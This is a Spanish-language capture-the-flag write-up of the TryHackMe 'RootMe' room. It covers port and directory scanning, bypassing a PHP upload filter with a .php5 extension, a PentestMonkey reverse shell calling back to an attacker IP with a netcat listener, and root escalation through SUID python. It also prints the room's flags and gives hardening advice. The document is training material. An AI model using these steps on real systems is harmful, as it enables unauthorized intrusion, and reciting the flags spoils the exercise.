# **Explotación de Máquina RootMe (TryHackMe)**

![Nivel: Fácil](https://img.shields.io/badge/Nivel-Fácil-green) ![Tema: File Upload + Privilege Escalation](https://img.shields.io/badge/Tema-File%20Upload%20%2B%20PrivEsc-blue)

## **Descripción**
Este repositorio documenta la explotación completa de la máquina **RootMe** de TryHackMe, que presenta:
1. Vulnerabilidad de subida de archivos sin validación adecuada
2. Bypass de restricciones de extensión PHP
3. Escalada de privilegios mediante binario SUID de Python

**Tiempo estimado**: 25-40 minutos  
**Dificultad**: Fácil  
**Sistema operativo**: Linux (Ubuntu)

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Explotación Web](#explotación-web)
3. [Shell Inversa](#shell-inversa)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo Inicial
```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.80.12 -oN escaneo
```

**Hallazgos clave**:
- **Puerto 22/tcp**: SSH - OpenSSH 7.6p1 Ubuntu
- **Puerto 80/tcp**: HTTP - Apache httpd 2.4.29

### 2. Descubrimiento de Directorios Web
```bash
gobuster dir -u http://10.10.80.12 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -t 50
```

**Directorios encontrados**:
- `/panel/` - Directorio de subida de archivos
- `/uploads/` - Directorio de archivos subidos
- `/css/`, `/js/`, `/images/` - Directorios estáticos

## **Explotación Web**

### 3. Análisis del Panel de Subida
- Acceso a `http://10.10.80.12/panel/`
- **Restricción identificada**: Bloqueo de extensiones `.php`
- **Bypass**: Uso de extensión alternativa `.php5`

### 4. Preparación del Payload
**Reverse Shell PHP (PentestMonkey)**:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
mv php-reverse-shell.php shell.php5
```

**Modificaciones**:
- Cambiar `$ip = '10.10.15.65';` (IP atacante)
- Cambiar `$port = 4444;` (Puerto escucha)

### 5. Subida y Ejecución
- Subir `shell.php5` al panel en `/panel/`
- Acceder al archivo en `http://10.10.80.12/uploads/shell.php5`

## **Shell Inversa**

### 6. Establecimiento de Conexión
**En máquina atacante**:
```bash
nc -lvnp 4444
```

**Resultado**: Shell obtenida como usuario `www-data`

### 7. Flag de Usuario
```bash
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
```
- **Flag user.txt**: `THM{y0u_g0t_a_sh3ll}`

## **Escalada de Privilegios**

### 8. Enumeración de Binarios SUID
```bash
find / -perm -4000 2>/dev/null
```

**Binarios interesantes**:
- `/usr/bin/python` (SUID bit set)

### 9. Explotación con Python
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Resultado**: Shell como **root** obtenida

### 10. Flag de Root
```bash
find / -name root.txt 2>/dev/null
cat /root/root.txt
```
- **Flag root.txt**: `THM{pr1v1l3g3_3sc4l4t10n}`

## **Conclusión**

### Vulnerabilidades Críticas
1. **Validación insuficiente en subida de archivos**
2. **Permisos SUID peligrosos en Python**
3. **Exposición de directorio `/uploads/`**

### Hardening Recomendado
- Implementar validación estricta de tipos de archivo
- Deshabilitar ejecución de scripts en directorios de upload
- Revisar y eliminar permisos SUID innecesarios
- Implementar WAF para prevenir ataques de file upload

### Técnicas Aplicadas
1. **Fuzzing de directorios** con Gobuster
2. **Bypass de extensiones** (.php5)
3. **Reverse Shell PHP**
4. **Escalada mediante SUID exploitation**

> ⚠️ **Aviso Legal**: Solo para uso en entornos controlados con permiso explícito.

---

**Herramientas utilizadas**:
- Nmap
- Gobuster
- Netcat
- Python

**Referencias**:
- [TryHackMe - RootMe Room](https://tryhackme.com/room/rootme)
- [GTFOBins - Python SUID](https://gtfobins.github.io/gtfobins/python/#suid)
- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)

**Tags**: `#TryHackMe #RootMe #FileUpload #SUID #Python #PrivEsc #CTF`

---

## **Lecciones Aprendidas**
- Las extensiones alternativas (.php5, .phtml) pueden bypassear filtros básicos
- Los binarios con SUID son vectores comunes de escalada
- La enumeración metódica es clave en CTFs
- Siempre revisar permisos de archivos y directorios

**Plataforma**: TryHackMe
